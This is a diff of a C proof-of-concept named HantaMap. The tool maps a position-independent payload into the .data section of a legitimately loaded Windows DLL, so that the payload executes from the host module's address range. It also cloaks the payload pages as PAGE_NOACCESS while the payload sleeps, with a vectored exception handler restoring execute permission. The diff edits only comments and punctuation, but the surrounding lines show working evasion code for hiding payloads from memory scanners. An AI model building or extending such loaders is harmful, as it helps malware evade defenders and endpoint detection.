@@ -1,5 +1,5 @@
 /*
- * mapper.c — HantaMap: Parasitic Data-Section Mapping PoC
+ * mapper.c - HantaMap: Parasitic Data-Section Mapping PoC
  *
  * Maps a PIC payload into the .data section of a legitimately loaded DLL.
  * The payload executes from an address range belonging to the host module,
@@ -39,7 +39,7 @@ static volatile LONG g_cloak_count = 0;
 
 /*
  * Called by the payload instead of Sleep. Runs from the mapper's .text.
- * Flips payload pages to PAGE_NOACCESS (reads/writes/scans blocked),
+ * Flips payload pages to PAGE_NOACCESS while sleeping,
  * sleeps, then flips back to PAGE_EXECUTE. The payload is unreadable
  * for the entire sleep duration.
  */
@@ -218,7 +218,7 @@ int main(void)
     memcpy(full_backup, data_base, data_vsize);
     printf("[+] .data backed up\n");
 
-    /* map payload at the end of .data — host globals at the start stay intact */
+    /* map payload at the end of .data so host globals at the start stay intact */
     SIZE_T payload_aligned = (payload_size + 0xFFF) & ~0xFFFULL;
     SIZE_T map_offset = data_aligned - payload_aligned;
     BYTE *map_base = data_base + map_offset;
@@ -232,7 +232,7 @@ int main(void)
     printf("[+] payload at %p (+0x%llx into .data)\n",
            (void *)map_base, (unsigned long long)map_offset);
 
-    /* VEH first, then flip protection — no unhandled-fault window */
+    /* VEH first, then flip protection (avoids unhandled-fault window) */
     g_tls_index = TlsAlloc();
     PVOID veh = AddVectoredExceptionHandler(1, veh_handler);
     VirtualProtect(map_base, payload_aligned, PAGE_EXECUTE, &old_prot);
